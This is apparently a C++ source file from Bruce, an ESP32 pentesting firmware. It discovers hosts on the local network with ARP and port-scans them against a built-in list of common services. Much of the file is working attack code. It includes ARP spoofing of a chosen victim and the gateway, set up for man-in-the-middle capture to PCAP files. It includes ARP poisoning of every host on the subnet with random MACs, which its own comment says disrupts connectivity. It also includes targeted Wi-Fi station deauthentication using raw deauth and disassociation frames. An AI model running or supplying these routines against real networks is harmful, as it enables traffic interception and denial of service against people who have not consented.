#include <globals.h>
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/wifi_common.h"
#include "scan_hosts.h"
#include "clients.h"
#include "wifi_atks.h" // to use Station Deauth
#include "core/utils.h"

//thx to 7h30th3r0n3, which made scanHosts faster using ARP

static std::vector<Host> hostslist;

// TODO: resolve clients name when in host mode through dhcp

// TODO: move to a config
TickType_t arpRequestDelay = 20u / portTICK_PERIOD_MS; // can be relatively low, helps to not overwhelm the stream

void readArpTable(netif * iface) {
  for( uint32_t i = 0; i < ARP_TABLE_SIZE; ++i ){
    ip4_addr_t* ip_ret;
    eth_addr* eth_ret;
    if( etharp_get_entry(i, &ip_ret, &iface, &eth_ret) ){
      hostslist.emplace_back(ip_ret, eth_ret);
    }
  }
  etharp_cleanup_netif(iface);
}

void local_scan_setup() {
    bool doScan = true;
    if(!wifiConnected) doScan=wifiConnectMenu();

    if (doScan) {
        hostslist.clear();

        // IPAddress uint32_t op returns number in big-endian
        // for simplicity of iteration and arithmetics convert to little-endian
        const uint32_t localIp = ntohl(WiFi.localIP());
        const IPAddress gateway = WiFi.gatewayIP();
        const uint32_t subnetMask = ntohl(WiFi.subnetMask());
        const uint32_t networkAddress = ntohl(gateway) & subnetMask;
        const uint32_t broadcast = networkAddress | ~subnetMask;

        // get iface
        void * netif = nullptr;
        tcpip_adapter_get_netif(TCPIP_ADAPTER_IF_STA, &netif);
        struct netif *net_iface = (struct netif *)netif;
        etharp_cleanup_netif(net_iface); // to avoid gateway duplication


        // send arp requests, read table each ARP_TABLE_SIZE requests
        uint16_t tableReadCounter = 0;
        uint32_t hostsScanned = 0;
        const uint32_t totalHosts = broadcast - networkAddress - 1;
        static uint32_t lastUpdate = 0;

        for( uint32_t ip_le = networkAddress + 1; ip_le < broadcast; ++ip_le ){
          if( ip_le == localIp ) continue;

          ip4_addr_t ip_be{htonl(ip_le)}; // big endian

          hostsScanned++;
          if (millis() - lastUpdate > 500) { // Update display every 500ms
            displayRedStripe("Probing " + String(hostsScanned) + " of " + String(totalHosts) + " hosts", getComplementaryColor2(bruceConfig.priColor), bruceConfig.priColor);
            lastUpdate = millis();
          }

          err_t res = etharp_request(net_iface, &ip_be);

          if( res != ERR_OK ){
            Serial.println("Arp req for: " + IPAddress(ip_be.addr).toString() + "failed with ec: " + res);
          } else {
            ++tableReadCounter;
          }

          vTaskDelay(arpRequestDelay);

          // read table if we sent ARP_TABLE_SIZE requests
          if( tableReadCounter == ARP_TABLE_SIZE ){
            readArpTable(net_iface);
            tableReadCounter = 0;
          }
        }

        ScanHostMenu:
        if (hostslist.empty()) {
            tft.println("No hosts found");
            delay(2000);
            return;
        }

        options = {};
        for(auto host:hostslist) {
          String result = host.ip.toString();
          if( host.ip == gateway ) result += "(GTW)";
          options.push_back({result.c_str(), [=](){ afterScanOptions(host); }});
        }
        addOptionToMainMenu();

        loopOptions(options);

        if(!returnToMenu) goto ScanHostMenu;
    }
    hostslist.clear();
}

void afterScanOptions(const Host& host) {
  int opt=0;
  options = {
    {"Host info",       [=](){ hostInfo(host); }},
  #ifndef LITE_VERSION
  {"SSH Connect",     lambdaHelper(ssh_setup,host.ip.toString())},
  #endif
    {"Station Deauth",  [&](){ opt=3; }},
    {"ARP Spoofing",    [=](){ arpSpoofing(host, false); }},
    {"ARP Poisoning",   arpPoisoner },
  };
  //if(sdcardMounted && bruceConfig.devMode) options.push_back({"ARP MITM (WIP)",  [&](){ opt=5;  }});
  loopOptions(options);
  if(opt==3) stationDeauth(host);
  if(opt==5)  {
    Serial.println("Starting MITM");
    arpSpoofing(host, true);
  }
}

struct PortScan { //struct pra holdar info das portas
    int port;
    unsigned long startTime;
    WiFiClient client;
    bool inProgress;
};

std::map<int, const char *> portServices = { //hmm
    {19, "CHARGEN"},
    {20, "FTP Data, FTP-DATA"},
    {21, "FTP Control, SFTP, FTP"},
    {22, "SSH, SFTP, SCP"},
    {23, "Telnet"},
    {25, "SMTP, SMTP (Submission)"},
    {42, "WINS Replication, nameserver"},
    {53, "DNS, DNS-TCP, DNS-UDP"},
    {67, "DHCP Server, BOOTP Server"},
    {68, "DHCP Client, BOOTP Client"},
    {69, "TFTP, TFTP-UDP"},
    {80, "HTTP, HTTP-ALT, Web"},
    {88, "Kerberos, Kerberos5"},
    {110, "POP3, Post Office Protocol"},
    {111, "RPCbind, Portmapper"},
    {113, "Ident, Auth, Authentication"},
    {119, "NNTP, Network News Transfer Protocol"},
    {123, "NTP, Network Time Protocol"},
    {135, "Microsoft RPC, EPMAP, DCE endpoint resolution"},
    {137, "NetBIOS Name Service"},
    {139, "NetBIOS Session Service, SMB"},
    {143, "IMAP, IMAP4"},
    {161, "SNMP"},
    {162, "SNMP Trap, SNMPTRAP"},
    {179, "BGP, Border Gateway Protocol"},
    {194, "IRC, Internet Relay Chat"},
    {389, "LDAP, Directory Services"},
    {427, "SLP, Service Location Protocol"},
    {443, "HTTPS, SSL/TLS, HTTP over TLS/SSL"},
    {445, "Microsoft-DS, SMB over TCP"},
    {464, "Kerberos Change/Set password"},
    {465, "SMTPS, SMTP over SSL"},
    {500, "ISAKMP, Internet Security Association and Key Management Protocol"},
    {514, "Syslog, Remote Shell"},
    {515, "LPD, Line Printer Daemon"},
    {520, "RIP, Routing Information Protocol"},
    {554, "RTSP, Real Time Streaming Protocol"},
    {587, "SMTP (Submission), Message Submission"},
    {631, "IPP, Internet Printing Protocol, CUPS"},
    {636, "LDAPS, LDAP over SSL"},
    {873, "rsync, Remote Sync"},
    {902, "VMware Server, VMware ESXi"},
    {989, "FTPS Data, FTP over SSL Data"},
    {990, "FTPS Control, FTP over SSL Control"},
    {993, "IMAPS, IMAP over SSL"},
    {995, "POP3S, POP3 over SSL"},
    {1024, "Reserved, First Available Dynamic Port"},
    {1025, "NFS-or-IIS, Microsoft RPC"},
    {1080, "SOCKS Proxy, SOCKS"},
    {1194, "OpenVPN, VPN"},
    {1337, "WASTE, WASTE Encrypted File Sharing"},
    {1352, "Lotus Notes, IBM Notes"},
    {1433, "MSSQL, Microsoft SQL Server"},
    {1434, "MSSQL Monitor, SQL Server Browser Service"},
    {1512, "WINS, Windows Internet Name Service"},
    {1521, "Oracle DB, Oracle Database, TNS Listener"},
    {1604, "Citrix, ICA"},
    {1701, "L2TP, Layer 2 Tunneling Protocol"},
    {1720, "H.323, VoIP"},
    {1723, "PPTP, VPN"},
    {1812, "RADIUS Authentication"},
    {1813, "RADIUS Accounting"},
    {1883, "MQTT, Message Queuing Telemetry Transport"},
    {1900, "SSDP, UPnP Discovery"},
    {2049, "NFS, Network File System"},
    {2082, "cPanel, HTTP Web Management"},
    {2083, "cPanel, Secure Web Management"},
    {2086, "WHM, Web Host Manager HTTP"},
    {2087, "WHM, Web Host Manager HTTPS"},
    {2095, "Webmail, cPanel Webmail"},
    {2181, "Zookeeper, Apache ZooKeeper"},
    {2222, "SSH Alt, DirectAdmin"},
    {2375, "Docker, Docker REST API"},
    {2376, "Docker TLS, Docker Secure"},
    {2379, "etcd Client, etcd API"},
    {2380, "etcd Server, etcd Peer"},
    {3128, "Squid Proxy, HTTP Proxy"},
    {3306, "MySQL, MariaDB"},
    {3389, "RDP, Remote Desktop Protocol, Terminal Services"},
    {3690, "SVN, Subversion"},
    {4000, "Remote Login, Remotely Anywhere"},
    {4500, "IPSec NAT-T, VPN"},
    {4789, "VXLAN, Virtual Extensible LAN"},
    {5000, "UPnP, Docker Registry"},
    {5060, "SIP, Session Initiation Protocol, VoIP"},
    {5061, "SIP over TLS, Secure SIP"},
    {5222, "XMPP, Jabber"},
    {5353, "mDNS, Multicast DNS, Bonjour"},
    {5432, "PostgreSQL, Postgres"},
    {5671, "AMQP over TLS, Secure AMQP"},
    {5672, "AMQP, RabbitMQ, Advanced Message Queuing Protocol"},
    {5900, "VNC, Virtual Network Computing"},
    {5985, "WinRM HTTP, Windows Remote Management"},
    {5986, "WinRM HTTPS, Windows Remote Management Secure"},
    {6379, "Redis, Redis Database"},
    {6443, "Kubernetes API, k8s API Server"},
    {6514, "Syslog over TLS"},
    {6667, "IRC, Internet Relay Chat"},
    {7001, "WebLogic, Oracle WebLogic"},
    {7077, "Apache Spark"},
    {8000, "HTTP Alt, HTTP Alternative"},
    {8080, "HTTP Proxy, Web Proxy, Alternative HTTP"},
    {8081, "HTTP Proxy Alt, Web Proxy Alternative"},
    {8443, "HTTPS Alt, HTTPS Alternative"},
    {8444, "Chia, Chia Blockchain"},
    {8888, "HTTP Alt, Alternative Web Server"},
    {9000, "SonarQube, Portainer"},
    {9042, "Cassandra, Apache Cassandra"},
    {9090, "Prometheus, Web Proxy"},
    {9100, "Raw Printing (JetDirect)"},
    {9200, "Elasticsearch, Elastic Search HTTP"},
    {9300, "Elasticsearch Nodes, Elastic Search Transport"},
    {9418, "Git, Git Protocol"},
    {10000, "Webmin, Web-based System Administration"},
    {11211, "Memcached, Memory Cache Daemon"},
    {15672, "RabbitMQ Management Console"},
    {27017, "MongoDB, MongoDB Wire Protocol"},
    {32768, "RPC, First Available Dynamic Port"},
    {49152, "Windows RPC"},
    {49153, "Windows RPC"},
    {49154, "Windows RPC"},
    {49155, "Windows RPC"},
    {49156, "Windows RPC"},
    {49157, "Windows RPC"}
};

void hostInfo(const Host& host) {
    const int MAX_SIMULTANEOUS = 10;  // Number of simultaneous connection attempts
    const int TIMEOUT_MS = 1000;      // Timeout for each connection attempt
    int scannedPorts = 0;
    // Initialize display
    drawMainBorder();
    tft.setTextSize(FP);
    tft.setCursor(8,30);
    tft.print("Host: " + host.ip.toString());
    tft.setCursor(8,42);
    tft.print("Mac: " + host.mac);
    tft.setCursor(8,54);
    tft.print("Manufacturer: " + getManufacturer(host.mac));
    tft.setCursor(8,66);
    tft.print("Scanning Ports...(hold esc to cancel)");
    tft.setCursor(8,78);
    tft.print("Ports Open: ");

    std::vector<PortScan> scans(MAX_SIMULTANEOUS);
    auto portIter = portServices.begin();
    int activeScanCount = 0;

    // Initialize scans
    for(auto& scan : scans) {
        scan.inProgress = false;
    }

    bool scanCanceled = false;
    while((portIter != portServices.end() || activeScanCount > 0) && !scanCanceled) {
        // Check for escape press
        if(check(EscPress)) {
            scanCanceled = true;
            // Stop all active scans
            for(auto& scan : scans) {
                if(scan.inProgress) {
                    scan.client.stop();
                    scan.inProgress = false;
                }
            }
            break;
        }

        // Start new scans if possible
        while(activeScanCount < MAX_SIMULTANEOUS && portIter != portServices.end()) {
            for(auto& scan : scans) {
                if(!scan.inProgress) {
                    scan.port = portIter->first;
                    scan.startTime = millis();
                    scan.inProgress = true;
                    printFootnote("scannng port: "+String(scan.port)+ " | remaining: "+String(portServices.size()-scannedPorts)); //printa portas escaneadas e restantes
                    scan.client.connect(host.ip, scan.port);
                    activeScanCount++;
                    portIter++;
                    break;
                }
            }
        }

        // Check ongoing scans
        for(auto& scan : scans) {
            if(scan.inProgress) {
                // Check if connected
                if(scan.client.connected()) {
                    if (tft.getCursorX()>(240-LW*4))
                        tft.setCursor(7,tft.getCursorY() + LH);
                    tft.setCursor(7, tft.getCursorY() + LH);
                    tft.print(scan.port);
                    tft.print(" (" + String(portServices[scan.port])+ ")");
                    scan.client.stop();
                    scan.inProgress = false;
                    activeScanCount--;
                                   }
                // Check for timeout
                else if(millis() - scan.startTime > TIMEOUT_MS) {
                    scan.client.stop();
                    scan.inProgress = false;
                    activeScanCount--;
                    scannedPorts++;
                }
            }
        }
        yield(); // Allow other tasks to run
    }

    tft.setCursor(8,tft.getCursorY()+16);
    if(scanCanceled) {
        tft.print("Scan Canceled!");
    } else {
        tft.print("Done!");
    }

    while(check(SelPress)) yield();
    while(!check(SelPress)) yield();
}


// ARP Poisoning and MITM POC first step (ARPSpoofing, not saving and forwarding packets)
#include <modules/wifi/sniffer.h> //use PCAP file saving functions
#include <esp_wifi.h>
#include <lwip/sockets.h>
#include <lwip/dns.h>
#include <lwip/inet.h>
#include <lwip/igmp.h>
#include <lwip/netif.h>
#include <lwip/err.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>
#include <lwip/init.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/ip_addr.h>
#include <lwip/etharp.h>
#include <iostream>
#include <sstream>
#include <iomanip>


// Função para converter IP para string
String ipToString(const uint8_t* ip) {
  return String(ip[0]) + "." + String(ip[1]) + "." + String(ip[2]) + "." + String(ip[3]);
}

// Função para converter MAC para string
String macToString(const uint8_t* mac) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

void stringToMAC(const std::string& macStr, uint8_t MAC[6]) {
    std::stringstream ss(macStr);
    unsigned int temp;
    for (int i = 0; i < 6; ++i) {
        char delimiter;
        ss >> std::hex >> temp;
        MAC[i] = static_cast<uint8_t>(temp);
        ss >> delimiter;
    }
}

// Função para obter o MAC do gateway
void getGatewayMAC(uint8_t gatewayMAC[6]) {
  wifi_ap_record_t ap_info;
  if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
    memcpy(gatewayMAC, ap_info.bssid, 6);
    Serial.print("Gateway MAC: ");
    Serial.println(macToString(gatewayMAC));
  } else {
    Serial.println("Erro ao obter informações do AP.");
  }
}

// Function provided by @Fl1p, thank you brother!
// Função para enviar pacotes ARP falsificados
void sendARPPacket(uint8_t *targetIP, uint8_t *targetMAC, uint8_t *spoofedIP, uint8_t *spoofedMAC, File pcapFile) {
  struct eth_hdr *ethhdr;
  struct etharp_hdr *arphdr;
  struct pbuf *p;
  struct netif *netif;


  // Obter interface de rede
  netif = netif_list;
  if (netif == NULL) {
    Serial.println("Nenhuma interface de rede encontrada!");
    return;
  }

  // Alocar pbuf para o pacote ARP
  p = pbuf_alloc(PBUF_RAW, sizeof(struct eth_hdr) + sizeof(struct etharp_hdr), PBUF_RAM);
  if (p == NULL) {
    Serial.println("Falha ao alocar pbuf!");
    return;
  }

  ethhdr = (struct eth_hdr *)p->payload;
  arphdr = (struct etharp_hdr *)((u8_t *)p->payload + SIZEOF_ETH_HDR);

  // Preencher cabeçalho Ethernet
  MEMCPY(&ethhdr->dest, targetMAC, ETH_HWADDR_LEN);  // MAC do alvo (vítima ou gateway)
  MEMCPY(&ethhdr->src, spoofedMAC, ETH_HWADDR_LEN);       // MAC do atacante (nosso)
  ethhdr->type = PP_HTONS(ETHTYPE_ARP);

  // Preencher cabeçalho ARP
  arphdr->hwtype = PP_HTONS(1); // 1 é o código para Ethernet no campo hardware type (hwtype)
  arphdr->proto = PP_HTONS(ETHTYPE_IP);
  arphdr->hwlen = ETH_HWADDR_LEN;
  arphdr->protolen = sizeof(ip4_addr_t);
  arphdr->opcode = PP_HTONS(ARP_REPLY);

  MEMCPY(&arphdr->shwaddr, spoofedMAC, ETH_HWADDR_LEN);  // MAC falsificado (gateway ou vítima)
  MEMCPY(&arphdr->sipaddr, spoofedIP, sizeof(ip4_addr_t)); // IP falsificado (gateway ou vítima)
  MEMCPY(&arphdr->dhwaddr, targetMAC, ETH_HWADDR_LEN);    // MAC real do alvo (vítima ou gateway)
  MEMCPY(&arphdr->dipaddr, targetIP, sizeof(ip4_addr_t)); // IP real do alvo (vítima ou gateway)

  // Enviar o pacote
  netif->linkoutput(netif, p);
  pbuf_free(p);
  Serial.println("Pacote ARP enviado!");

  // Capturar o pacote no arquivo PCAP
  if (pcapFile) {
    pcapFile.write((const uint8_t *)p->payload, p->tot_len); // don't know if it will work
    pcapFile.flush();
  }

}


// Converts from IP String to byte array
bool parseIPString(const String &ipStr, uint8_t *ipArray) {
  int parts[4] = {0};
  int count = sscanf(ipStr.c_str(), "%d.%d.%d.%d", &parts[0], &parts[1], &parts[2], &parts[3]);
  if (count == 4) {
    for (int i = 0; i < 4; i++) {
      ipArray[i] = (uint8_t)parts[i];
    }
    return true;
  }
  return false;
}
bool arpPCAPfile(File &pcapFile) {
  static int nf=0;
  FS *fs;
  if(setupSdCard()) fs=&SD;
  else {
    fs=&LittleFS;
  }
  if(!fs->exists("/BrucePCAP")) fs->mkdir("/BrucePCAP");
  while(fs->exists(String("/BrucePCAP/ARP_session_" + String(nf++) + ".pcap").c_str())) yield();
  pcapFile = fs->open(String("/BrucePCAP/ARP_session_" + String(nf) + ".pcap").c_str(), FILE_WRITE);
  if(pcapFile) return true;
  else return false;
}

void arpSpoofing(const Host& host, bool mitm) {

  uint8_t gatewayIP[4];// Gateway IP Address
  uint8_t victimIP[4]; // Victim IP Address
  uint8_t gatewayMAC[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
  uint8_t victimMAC[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
  uint8_t myMAC[6];  // ESP32 MAC Address

  File pcapFile;
  if(!arpPCAPfile(pcapFile)) Serial.println("Fail creating ARP Pcap file");
  writeHeader(pcapFile); // write pcap header into the file

  // Get the MAC from the attacker (bruce MAC)
  esp_read_mac(myMAC, ESP_MAC_WIFI_STA);
  for(int i=0; i<4; i++) victimIP[i] = host.ip[i];
  stringToMAC(host.mac.c_str(),victimMAC);
  getGatewayMAC(gatewayMAC);
  IPAddress gatewayIp = WiFi.gatewayIP();
  for(int i=0; i<4; i++) gatewayIP[i] = gatewayIp[i];

  drawMainBorderWithTitle("ARP Spoofing");
  padprintln("");
  padprintln("Single Target Attack.");

  if(mitm) {
    tft.setTextSize(FP);
    //padprintln("Man in The middle Activated");
    //padprintln("/BrucePCAP/ARP_session_" + String(nf) + ".pcap");
    Serial.println("Still in development");
  }
  padprintln("Tgt:" + host.mac);
  padprintln("Tgt: " + ipToString(victimIP));
  padprintln("GTW:" + macToString(gatewayMAC));
  padprintln("");
  padprintln("Press Any key to STOP.");


  long tmp=0;
  int count=0;
  while(!check(AnyKeyPress)) {
    if(tmp+2000<millis()){  // sends frames every 2 seconds
      // Sends false ARP response data to the victim (Gataway IP now sas our MAC Address)
      sendARPPacket(victimIP, victimMAC, gatewayIP, myMAC, pcapFile);

      // Sends false ARP response data to the Gateway (Victim IP now has our MAC Address)
      sendARPPacket(gatewayIP, gatewayMAC, victimIP, myMAC, pcapFile);
      tmp=millis();
      count++;
      tft.drawRightString("Spoofed " + String(count) + " times",tftWidth-12,tftHeight-16,1);
    }
  }

  if(mitm) {
    // Configures Promiscuous mode
    Serial.println("Promiscuous mode deactivated.");
  }

  // Restore ARP Table
  sendARPPacket(victimIP, victimMAC, gatewayIP, gatewayMAC, pcapFile);
  sendARPPacket(gatewayIP, gatewayMAC, victimIP, victimMAC, pcapFile);

  pcapFile.flush();
  pcapFile.close();

}

// arp Poisoner sends ARP poisoned packets of all devices of the network
// it can cause network issues, preventing the connections to work for a good time
// make sure you know what you are doing.
void arpPoisoner() {

  uint8_t gatewayIP[4];   // Gateway IP Address
  uint8_t victimIP[4];    // Victim IP Address
  uint8_t gatewayMAC[6];  // Gateway MAC
  uint8_t victimMAC[6];   // Victim MAC
  File pcapFile;

  if(!arpPCAPfile(pcapFile)) Serial.println("Fail creating ARP Pcap file");

  for (int i = 0; i < 6; i++){
    gatewayMAC[i] = random(256);
    victimMAC[i] = random(256);
  }
  IPAddress ip = WiFi.gatewayIP();
  for(int i=0; i<4;i++) {
    gatewayIP[i]=ip[i];
    victimIP[i]=ip[i];
  }
  long tmp=0;
  drawMainBorderWithTitle("ARP Poisoning");
  padprintln("");
  padprintln("Sending ARP msg to all hosts");
  padprintln("");


  padprintln("Press Any key to STOP.");


  while(!check(AnyKeyPress)) {
    if(tmp+5000<millis()){  // sends frames every 5 seconds
        for (int i = 0; i < 6; i++){
          gatewayMAC[i] = random(256); // Create other random MAC to the Gateway
        }
      for(int i=1;i<255;i++) {
        victimIP[3]=i;
        for (int i = 0; i < 6; i++){
          victimMAC[i] = random(256); // Create random MAC to all hosts
        }
        // Sends random Gateway MAC to all devices in the network
        sendARPPacket(victimIP, victimMAC, gatewayIP, gatewayMAC, pcapFile);

        // Sends Device random MACs back to gateway
        sendARPPacket(gatewayIP, gatewayMAC, victimIP, victimMAC, pcapFile);

        delay(10);
        tft.drawRightString("   " + String(victimIP[0]) + "." + String(victimIP[1]) + "." + String(victimIP[2]) + "." + String(i), tftWidth-12,tftHeight-16,1);
      }
      tmp=millis();
      tft.drawRightString("     Waiting...",tftWidth-12,tftHeight-16,1);
    }
  }
  pcapFile.close();
}



// Station deauther for targetted attack.
void stationDeauth(Host host) {
  uint8_t MAC[6];
  uint8_t gatewayMAC[6];
  uint8_t victimIP[4];
  wifi_ap_record_t sta_record;
  for(int i=0;i<4;i++) victimIP[i]=host.ip[i];
  String tssid = WiFi.SSID();
  int channel;
  getGatewayMAC(gatewayMAC);
  esp_wifi_get_channel(&ap_record.primary, &ap_record.second);
  channel = ap_record.primary;
  wifiDisconnect();
  delay(10);
  WiFi.mode(WIFI_AP);
  if (!WiFi.softAP(tssid, emptyString, channel, 1, 4, false)) {
    Serial.println("Fail Starting AP Mode");
    displayError("Fail starting Deauth",true);
    return;
  }

  memcpy(ap_record.bssid, gatewayMAC, 6);
  stringToMAC(host.mac.c_str(), MAC);
  memcpy(sta_record.bssid, MAC, 6);

  // Prepare deauth frame for each AP record
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

  drawMainBorderWithTitle("Station Deauth");
  tft.setTextSize(FP);
  padprintln("Trying to deauth one target.");
  padprintln("Tgt:" + host.mac);
  padprintln("Tgt: " + ipToString(victimIP));
  padprintln("GTW:" + macToString(gatewayMAC));
  padprintln("");
  padprintln("Press Any key to STOP.");

  long tmp=millis();
  int cont=0;
  while(!check(AnyKeyPress)) {
    // Send packets from AP to STA
    wsl_bypasser_send_raw_frame(&ap_record,ap_record.primary,MAC);
    deauth_frame[0]=0xc0; // Deauth Frame
    send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
    deauth_frame[0]=0xa0; // Disassociate Frame
    send_raw_frame(deauth_frame, sizeof(deauth_frame_default));

    // Send packets from STA to AP
    wsl_bypasser_send_raw_frame(&sta_record,ap_record.primary,gatewayMAC);
    deauth_frame[0]=0xc0; // Deauth Frame
    send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
    deauth_frame[0]=0xa0; // Disassociate Frame
    send_raw_frame(deauth_frame, sizeof(deauth_frame_default));


    cont+=3*4;
    delay(50);
    if(millis()-tmp>1000) {
      tft.drawRightString(String(cont) + " fps", tftWidth-12,tftHeight-16,1);
      cont=0;
      tmp=millis();
    }
  }

  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
  wifiDisconnect();
}
